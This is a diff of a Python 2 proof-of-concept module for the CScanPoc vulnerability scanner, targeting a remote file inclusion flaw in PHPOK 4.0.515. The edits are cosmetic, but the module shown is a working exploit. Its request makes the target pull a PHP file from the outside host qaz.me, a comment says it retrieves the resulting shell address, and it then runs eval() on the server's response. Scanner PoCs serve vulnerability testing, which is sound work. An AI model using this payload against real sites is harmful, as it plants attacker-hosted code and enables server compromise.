@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import sys
 
+
 class Vuln(ABVuln):
     vuln_id = 'PHPOK_0004_p'  # 平台漏洞编号，留空
     name = 'PHPOK 4.0.515 远程文件包含'  # 漏洞名称
@@ -34,12 +35,12 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #需要有准备好的远程文件 c.txt?.php
-            #<?php echo md5(c);?>
+            # 需要有准备好的远程文件 c.txt?.php
+            # <?php echo md5(c);?>
             payload = "/index.php?c=ueditor&f=remote_image&upfile=http://qaz.me/c.txt?.php"
             url = self.target + payload
             r = requests.get(url)
-            #获取shell地址
+            # 获取shell地址
             try:
                 r_dict = eval(r.text)
             except Exception, e:
@@ -52,12 +53,13 @@ class Poc(ABPoc):
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
